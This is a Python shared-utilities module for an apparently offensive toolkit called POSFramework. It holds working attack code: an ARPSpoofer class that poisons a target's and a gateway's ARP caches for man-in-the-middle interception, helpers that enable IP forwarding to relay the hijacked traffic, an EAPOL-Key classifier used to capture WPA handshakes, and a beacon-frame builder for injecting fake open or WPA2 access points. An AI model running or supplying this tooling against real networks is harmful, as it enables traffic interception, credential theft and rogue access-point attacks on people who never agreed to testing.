"""
Shared utilities for POSFramework.

Consolidated common patterns used across multiple modules:
  - EAPOL message identification
  - IP forwarding management
  - ARP poisoning
  - Beacon frame construction
"""

import struct
import subprocess
import time
import threading
from typing import Optional, Tuple

try:
    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
    _HAS_SCAPY = True
except ImportError:
    _HAS_SCAPY = False
    ARP = Ether = sendp = srp = get_if_hwaddr = None
    Dot11 = Dot11Beacon = Dot11Elt = RadioTap = None

from .config import IS_LINUX, IS_WINDOWS, NETWORK_GW_IP, log


# ─── EAPOL Message Identification ─────────────────────────────────────────────

def identify_eapol_message(eapol_raw: bytes) -> int:
    """
    Identify EAPOL-Key message number from raw EAPOL frame.
    Single canonical implementation — replaces 4 duplicate copies.
    
    Returns:
        1-4 for standard 4-way handshake messages
        5-6 for group key handshake
        0 if unrecognized
    """
    if len(eapol_raw) < 10:
        return 0
    mv = memoryview(eapol_raw) if not isinstance(eapol_raw, memoryview) else eapol_raw
    key_info = struct.unpack(">H", mv[5:7])[0]
    key_ack = (key_info >> 7) & 1
    key_mic = (key_info >> 8) & 1
    secure = (key_info >> 9) & 1
    install = (key_info >> 6) & 1
    pairwise = (key_info >> 3) & 1

    if not pairwise:
        if key_ack and key_mic and secure:
            return 5  # Group Key M1
        if not key_ack and key_mic and secure:
            return 6  # Group Key M2
        return 0

    if key_ack and not key_mic:
        return 1
    if not key_ack and key_mic and not secure:
        return 2
    if key_ack and key_mic and install:
        return 3
    if not key_ack and key_mic and secure:
        return 4
    return 0


# ─── IP Forwarding ─────────────────────────────────────────────────────────────

def enable_ip_forwarding() -> Optional[str]:
    """
    Enable kernel IP forwarding. Returns the original value for restoration.
    Single implementation — replaces 3 duplicate copies.
    """
    original = None
    if IS_LINUX:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                original = f.read().strip()
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            log.debug("IP forwarding enabled")
        except (IOError, PermissionError):
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           capture_output=True, timeout=5)
    elif IS_WINDOWS:
        subprocess.run(
            ["reg", "add",
             r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
             "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
            capture_output=True, timeout=10)
    return original


def disable_ip_forwarding(original: Optional[str] = None):
    """Restore IP forwarding to its original state."""
    if IS_LINUX:
        value = original or "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(value)
        except (IOError, PermissionError):
            pass


# ─── ARP Poisoning ─────────────────────────────────────────────────────────────

class ARPSpoofer:
    """
    Reusable ARP cache poisoner. Replaces 3 near-identical implementations.
    
    Usage:
        spoofer = ARPSpoofer(interface, target_ip, gateway_ip)
        spoofer.start()
        ...
        spoofer.stop()  # restores ARP tables
    """

    def __init__(self, interface: str, target_ip: str, gateway_ip: str,
                 interval: float = 2.0):
        if not _HAS_SCAPY:
            raise ImportError("scapy is required for ARPSpoofer")
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self.running = False
        self._thread = None
        self._attacker_mac = get_if_hwaddr(interface)
        self._target_mac = None
        self._gateway_mac = None

    def _resolve_mac(self, ip: str) -> Optional[str]:
        """Resolve IP to MAC via ARP request."""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         iface=self.interface, timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return None

    def _poison_loop(self):
        """Continuously send spoofed ARP replies."""
        while self.running:
            try:
                # Tell target: gateway is at attacker_mac
                if self._target_mac:
                    pkt = Ether(dst=self._target_mac) / ARP(
                        op=2, pdst=self.target_ip, hwdst=self._target_mac,
                        psrc=self.gateway_ip, hwsrc=self._attacker_mac)
                    sendp(pkt, iface=self.interface, verbose=False)

                # Tell gateway: target is at attacker_mac
                if self._gateway_mac:
                    pkt = Ether(dst=self._gateway_mac) / ARP(
                        op=2, pdst=self.gateway_ip, hwdst=self._gateway_mac,
                        psrc=self.target_ip, hwsrc=self._attacker_mac)
                    sendp(pkt, iface=self.interface, verbose=False)
            except Exception as e:
                log.debug(f"ARP spoof error: {e}")
            time.sleep(self.interval)

    def start(self) -> bool:
        """Start ARP poisoning. Returns False if MAC resolution fails."""
        self._target_mac = self._resolve_mac(self.target_ip)
        self._gateway_mac = self._resolve_mac(self.gateway_ip)
        if not self._target_mac or not self._gateway_mac:
            log.warning(f"ARP resolution failed: target={self._target_mac} gw={self._gateway_mac}")
            return False

        self.running = True
        self._thread = threading.Thread(target=self._poison_loop, daemon=True)
        self._thread.start()
        log.info(f"ARP spoofing: {self.target_ip} ↔ {self.gateway_ip}")
        return True

    def stop(self):
        """Stop poisoning and restore ARP tables."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        # Restore correct ARP entries
        if self._target_mac and self._gateway_mac:
            for _ in range(3):
                restore_target = Ether(dst=self._target_mac) / ARP(
                    op=2, pdst=self.target_ip, hwdst=self._target_mac,
                    psrc=self.gateway_ip, hwsrc=self._gateway_mac)
                restore_gw = Ether(dst=self._gateway_mac) / ARP(
                    op=2, pdst=self.gateway_ip, hwdst=self._gateway_mac,
                    psrc=self.target_ip, hwsrc=self._target_mac)
                sendp(restore_target, iface=self.interface, verbose=False)
                sendp(restore_gw, iface=self.interface, verbose=False)


# ─── Beacon Frame Construction ─────────────────────────────────────────────────

def build_beacon_frame(ssid: str, src_mac: str, channel: int = 6,
                       security: str = "open") -> bytes:
    """
    Build a complete beacon frame ready for injection.
    Single implementation — replaces 4 duplicate constructions.
    
    Args:
        ssid: Network name
        src_mac: Source/BSSID MAC address
        channel: Channel number for DS parameter set
        security: 'open' or 'wpa2'
    
    Returns:
        Raw bytes of the complete frame (RadioTap + Dot11 + Beacon + IEs)
    
    Raises:
        ImportError: If scapy is not available.
    """
    if not _HAS_SCAPY:
        raise ImportError("scapy is required for build_beacon_frame")
    frame = (
        RadioTap() /
        Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
              addr2=src_mac, addr3=src_mac) /
        Dot11Beacon(cap="ESS") /
        Dot11Elt(ID=0, info=ssid.encode()) /
        Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
        Dot11Elt(ID=3, info=bytes([channel]))
    )
    if security == "wpa2":
        # Add RSN IE for WPA2-PSK
        rsn_ie = (
            b"\x01\x00"              # Version 1
            b"\x00\x0f\xac\x04"     # Group cipher: CCMP
            b"\x01\x00"              # Pairwise count: 1
            b"\x00\x0f\xac\x04"     # Pairwise cipher: CCMP
            b"\x01\x00"              # AKM count: 1
            b"\x00\x0f\xac\x02"     # AKM: PSK
            b"\x00\x00"              # RSN capabilities
        )
        frame = frame / Dot11Elt(ID=48, info=rsn_ie)
    from scapy.all import raw as scapy_raw
    return scapy_raw(frame)
